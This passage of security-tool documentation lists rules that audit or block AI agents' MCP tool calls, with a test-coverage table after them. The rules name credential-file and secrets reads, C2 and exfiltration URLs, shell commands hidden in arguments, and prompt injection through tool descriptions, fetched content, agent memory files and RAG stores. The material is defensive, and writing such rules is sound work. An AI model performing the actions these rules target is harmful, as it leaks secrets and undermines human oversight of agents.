| `mcp-recon-audit-passwd-read` | AUDIT | mcp_rule | Reading /etc/passwd enumerates local user accounts — used to identify privilege escalation targets. MITRE T1087. |
| `mcp-recon-audit-hosts-read` | AUDIT | mcp_rule | Reading /etc/hosts maps internal hostnames to IPs — used for lateral movement target identification. MITRE T1016. |
| `mcp-recon-audit-localhost-probe` | AUDIT | structural | HTTP probe to localhost or 127.0.0.1 flagged — may enumerate internal services (admin panels, dev servers, management APIs). LLM02, MITRE T1046. |
| `mcp-recon-block-actuator-credentials` | BLOCK | structural | Spring Boot Actuator credential-exposing endpoint blocked — /actuator/heapdump and /actuator/env directly leak secrets, passwords, and API keys. LLM02, CWE-200, MITRE T1082. |
| `mcp-recon-block-k8s-secrets` | BLOCK | structural | Kubernetes secrets API access blocked — exposes cluster secrets, service account tokens, and RBAC configuration. LLM02, CWE-284, MITRE T1213. |
| `mcp-recon-audit-spring-actuator` | AUDIT | structural | Spring Boot Actuator endpoint access flagged — exposes application metrics, env vars, heap dumps, and config. LLM02, MITRE T1082. |
| `mcp-recon-audit-admin-paths` | AUDIT | structural | Generic management or admin path access flagged — common control plane endpoints may expose sensitive config, operational data, or debug interfaces. LLM02, MITRE T1082. |
| `mcp-recon-audit-db-schema-enum` | AUDIT | structural | Database schema enumeration query detected — maps table structure before targeted data extraction. LLM06, MITRE T1213. |

### supply-chain (7 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-sc-block-lockfile-write` | BLOCK | structural | MCP write to dependency lock file — lock files are machine-generated checksums. Hand-editing can pin a compromised version or strip integrity hashes. MITRE T1195.001. |
| `mcp-sc-block-cicd-config-write` | BLOCK | structural | MCP write to CI/CD pipeline config — pipeline modifications can inject malicious build steps, exfiltrate secrets, or backdoor release artifacts. Requires human review. MITRE T1195.002. |
| `mcp-sc-block-dockerfile-write` | BLOCK | structural | MCP write to Dockerfile or docker-compose config — injecting malicious RUN/COPY/ENV instructions backdoors every container built from this image. Requires human review. MITRE T1612, T1195.002. |
| `mcp-sc-block-training-data-write` | BLOCK | structural | MCP write to ML training dataset — injecting poisoned examples corrupts fine-tuned model behavior. MITRE AML.T0010, OWASP LLM04. |
| `mcp-sc-block-model-checkpoint-write` | BLOCK | structural | MCP write to model checkpoint file — PyTorch .pt/.pkl files can contain pickle exploits that execute on load. Checkpoint substitution backdoors every inference run. MITRE T1195.001. |
| `mcp-sc-audit-package-manifest-write` | AUDIT | structural | MCP write to package manifest — dependency changes expand the attack surface and may introduce typosquatted or compromised packages. Flagged for human review. MITRE T1195.001. |
| `mcp-sc-audit-rag-write` | AUDIT | structural | MCP tool call matching a RAG knowledge base write operation — injecting adversarial documents into a vector store poisons AI-grounded outputs without modifying the model. OWASP LLM08, MITRE AML.T0010. |

### unauthorized-execution (18 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-content-audit-security-doc-write` | AUDIT | mcp_rule | AI-generated write to SECURITY file — requires human review before committing (LLM09: misinformation propagation risk) |
| `mcp-content-audit-compliance-dir-write` | AUDIT | mcp_rule | AI-generated write to audit directory — fabricated audit results are a compliance liability (LLM09) |
| `mcp-content-audit-compliance-file-write` | AUDIT | mcp_rule | AI-generated write to compliance directory — unverified compliance claims require human sign-off (LLM09) |
| `mcp-content-audit-runbook-write` | AUDIT | mcp_rule | AI-generated write to runbook — incorrect incident response procedures are a safety risk (LLM09) |
| `mcp-persist-audit-instruction-file-write` | AUDIT | structural | MCP write to AI agent instruction or memory file — injecting malicious instructions poisons future agent sessions (persistent inter-session prompt injection). OWASP LLM01/LLM08. |
| `mcp-response-integrity-audit-web-fetch` | AUDIT | mcp_rule | Web-fetch tool retrieves external content — responses may contain prompt injection or exfiltration directives (LLM01, LLM05: mcp-tool-response-poisoning) |
| `mcp-response-integrity-audit-fetch-pattern` | AUDIT | mcp_rule | Tool name pattern suggests external content retrieval — audit for response poisoning risk (LLM01, LLM05) |
| `mcp-response-integrity-audit-url-arg` | AUDIT | mcp_rule | Tool call passes an HTTP URL argument — external content will be returned as tool response, audit for injection risk (LLM01) |
| `mcp-response-integrity-block-exfil-url` | BLOCK | mcp_rule | Fetch URL matches exfiltration/C2 pattern — blocking to prevent response-poisoning-driven data theft (LLM05, LLM06) |
| `mcp-guardian-tool-description-poisoning` | BLOCK | mcp_rule | MCP tool description poisoning detected — hidden instructions or credential-harvesting prompts found in tool metadata |
| `mcp-struct-block-shell-execution` | BLOCK | structural | MCP tool that executes shell commands should go through AgentShield's command pipeline |
| `mcp-struct-block-prompt-injection-text` | BLOCK | structural | Prompt injection detected in text argument — attempt to manipulate LLM behavior |
| `mcp-struct-block-prompt-injection-content` | BLOCK | structural | Prompt injection detected in content argument — attempt to manipulate LLM behavior |
| `mcp-struct-block-prompt-injection-messages` | BLOCK | structural | Prompt injection detected in messages argument — attempt to manipulate LLM behavior |
| `mcp-struct-block-sql-injection-query` | BLOCK | structural | SQL injection detected in query argument |
| `mcp-struct-block-sql-injection-filter` | BLOCK | structural | SQL injection detected in filter argument |
| `mcp-struct-block-shell-in-command-arg` | BLOCK | structural | Shell command detected in command argument — possible disguised execution tool |
| `mcp-struct-block-shell-in-exec-arg` | BLOCK | structural | Shell command detected in exec argument — hidden command execution |

### uncategorized (6 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-struct-audit-changelog-write` | AUDIT | structural | AI-generated write to compliance-sensitive documentation — human review required before publishing (LLM09: hallucination injection / misinformation propagation) |
| `mcp-fin-block-all-balance-amount` | BLOCK | structural | Unbounded transfer detected — 'ALL_BALANCE' or equivalent string indicates intent to send entire balance |
| `mcp-fin-block-all-balance-value` | BLOCK | structural | Unbounded transfer detected — 'ALL_BALANCE' or equivalent string in value argument |
| `mcp-response-integrity-struct-block-c2-url` | BLOCK | structural | Fetch to known red-team/C2 domain — response poisoning or exfiltration attempt (LLM05, T1659) |
| `mcp-response-integrity-struct-audit-credential-url` | AUDIT | structural | Fetch URL contains credential-like query parameters — audit for response poisoning exfiltration (LLM06) |
| `mcp-struct-block-credential-path-access` | BLOCK | structural | MCP tool accessing credential/sensitive path detected by structural match |

## Test Coverage

| Kingdom | TP | TN | Total |
|---------|----|----|-------|
| credential-exposure | 139 | 105 | 244 |
| data-exfiltration | 181 | 108 | 289 |
| destructive-ops | 76 | 51 | 127 |
| persistence-evasion | 200 | 124 | 324 |
| privilege-escalation | 197 | 124 | 321 |
| reconnaissance | 128 | 51 | 179 |
| supply-chain | 93 | 67 | 160 |
| unauthorized-execution | 210 | 143 | 353 |
| **Total** | **1224** | **773** | **1997** |

